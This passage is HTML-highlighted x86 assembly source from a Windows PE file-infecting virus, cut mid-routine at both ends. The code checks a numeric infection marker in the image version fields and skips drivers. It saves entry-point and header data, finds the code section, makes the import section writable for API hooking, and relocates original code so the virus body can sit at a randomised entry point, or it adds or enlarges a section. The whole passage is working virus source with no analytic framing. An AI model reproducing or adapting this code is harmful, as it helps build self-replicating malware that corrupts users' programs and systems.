       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optionalheader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_MajorImageVersion</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">skip_check</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_MinorImageVersion</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">skip_check</span><span class="sc0">                               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InitCopro</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fild</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_MajorImageVersion</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;this is number b</span><span class="sc0">
       </span><span class="sc7">fild</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_MajorImageVersion</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fmul</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fild</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_MinorImageVersion</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;this is number c</span><span class="sc0">
       </span><span class="sc7">fild</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_MinorImageVersion</span><span class="sc4">]</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fmul</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fadd</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc7">fsub</span><span class="sc0">                                        </span><span class="sc1">;here is b^2+c^2-a^2</span><span class="sc0">
       </span><span class="sc7">fldz</span><span class="sc0">                                        </span><span class="sc1">;is it 0?</span><span class="sc0">
       </span><span class="sc7">fcompp</span><span class="sc0">                                      </span><span class="sc1">;compare them</span><span class="sc0">
       </span><span class="sc7">fstsw</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">                                    </span><span class="sc1">;get status word</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RestoreCopro</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sahf</span><span class="sc0">                                        </span><span class="sc1">;load flags with it</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">close_address</span><span class="sc0">                            </span><span class="sc1">;is it already infected?</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">skip_check</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_Subsystem</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_SUBSYSTEM_NATIVE</span><span class="sc1">; check if it is not</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">close_address</span><span class="sc0">                            </span><span class="sc1">;a driver...</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_AddressOfEntryPoint</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;save entry eip</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_ImageBase</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;imagebase</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_SectionAlignment</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;section align</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_FileAlignment</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;file align</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_SizeOfImage</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;size of image</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_SizeOfHeaders</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;headers size</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_CheckSum</span><span class="sc4">]</span><span class="sc0">                  </span><span class="sc1">;and checksum</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_NumberOfRvaAndSizes</span><span class="sc4">]</span><span class="sc0">       </span><span class="sc1">;save number of dirs..</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_BaseOfCode</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">;and base of code</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sizeofoptionalheader</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;mov to first sec header</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numberofsections</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">scan_for_code</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;get the RVA</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">baseofcode</span><span class="sc4">]</span><span class="sc0">                   </span><span class="sc1">;is it the code section?</span><span class="sc0">
       </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">found_code_section</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">        </span><span class="sc1">;no... get next...</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">scan_for_code</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">close_address</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">found_code_section</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionheader</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">            </span><span class="sc1">;save code section ptr</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionrva</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionraw</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_smaller</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionsize</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">APIHOOK</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">optionalheader</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">numberofsections</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.OH_DataDirectory.DE_Import.DD_VirtualAddress</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">over_import</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">sizeofoptionalheader</span><span class="sc4">]</span><span class="sc0">         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">scan_for_imports</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualAddress</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;get the RVA</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;is it the import section?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">found_import</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">maybe_found</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">search_next_import</span><span class="sc0">                      </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">maybe_found</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">found_import</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">search_next_import</span><span class="sc4">:</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">IMAGE_SIZEOF_SECTION_HEADER</span><span class="sc0">        </span><span class="sc1">;no... get next...</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">scan_for_imports</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">no_import_found</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">found_import</span><span class="sc4">:</span><span class="sc0">                                      </span><span class="sc1">;enable write on the</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_Characteristics</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">IMAGE_SCN_MEM_WRITE</span><span class="sc1">; imports, credits to</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">no_imports</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">                  </span><span class="sc1">;Bumblebee for this.</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">over_import</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_import_found</span><span class="sc4">:</span><span class="sc0">                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">no_imports</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">FALSE</span><span class="sc0">                 </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">over_import</span><span class="sc4">:</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">locate_last_section_stuff</span><span class="sc0">              </span><span class="sc1">;locate stuff in the last</span><span class="sc0">
                                                   </span><span class="sc1">;section</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">add_new_section</span><span class="sc0">                        </span><span class="sc1">;add a new section</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">ok_go_with_it</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">increase_last_section</span><span class="sc0">                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finaldestination</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">do_virus_movement</span><span class="sc0">                       </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">ok_go_with_it</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;get the 2 sizes and be</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">                          </span><span class="sc1">;sure we are smaller then</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">set_method_1</span><span class="sc0">                             </span><span class="sc1">;both of them...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">set_method_1</span><span class="sc0">                             </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">size_is_ok</span><span class="sc4">:</span><span class="sc0">                                        </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">                          </span><span class="sc1">;do we fit into the code</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">set_method_1</span><span class="sc0">                             </span><span class="sc1">;section?</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">method</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">METHOD_MOVE_CODE</span><span class="sc0">          </span><span class="sc1">;if yes, move the code...</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">establish_home</span><span class="sc4">:</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionheader</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_SizeOfRawData</span><span class="sc4">]</span><span class="sc0">             </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_VirtualSize</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">choose_smaller</span><span class="sc0">                         </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esi.SH_PointerToRawData</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;get pointer to data</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codesectionraw</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">               </span><span class="sc1">;save it...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                                </span><span class="sc1">;get a delta difference</span><span class="sc0">
       </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">RANDOMIZE_ENTRY</span><span class="sc0">                          </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">                          </span><span class="sc1">;to place us in and</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                     </span><span class="sc1">;randomize it...</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">brandom32</span><span class="sc0">                              </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ELSE</span><span class="sc0">                                        </span><span class="sc1">;                                    ;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc9">ENDIF</span><span class="sc0">                                       </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">codedelta</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                    </span><span class="sc1">;from where we start?</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check_intersection</span><span class="sc0">                     </span><span class="sc1">;are we intersecting with</span><span class="sc0">
       </span><span class="sc6">jnc</span><span class="sc0"> </span><span class="sc5">continue_process</span><span class="sc0">                        </span><span class="sc1">;other directories?</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">establish_home</span><span class="sc0">                         </span><span class="sc1">;if yes, try again!</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">set_method_1</span><span class="sc0">                            </span><span class="sc1">;if cannot find place move</span><span class="sc0">
                                                   </span><span class="sc1">;at end!</span><span class="sc0">
                                                   </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">continue_process</span><span class="sc4">:</span><span class="sc0">                                  </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                    </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">last_section_destination</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;save our destination...</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">haddress</span><span class="sc4">]</span><span class="sc0">                     </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">_IsBadWritePtr</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">virussize</span><span class="sc0">   </span><span class="sc1">;can we write?</span><span class="sc0">
       </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">close_address</span><span class="sc0">                           </span><span class="sc1">;</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">move_virus_size</span><span class="sc0">                        </span><span class="sc1">;move the original code</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                                     </span><span class="sc1">;from here...</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">finaldestination</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">             </span><span class="sc1">;save the destination of</span><span class="sc0">
                                                   </span><span class="sc1">;code</span><span class="sc0">
</span><span class="sc5">do_virus_movement</span><span class="sc4">:</span><span class="sc0">                                 </span><span class="sc1">;</span><span class="sc0">
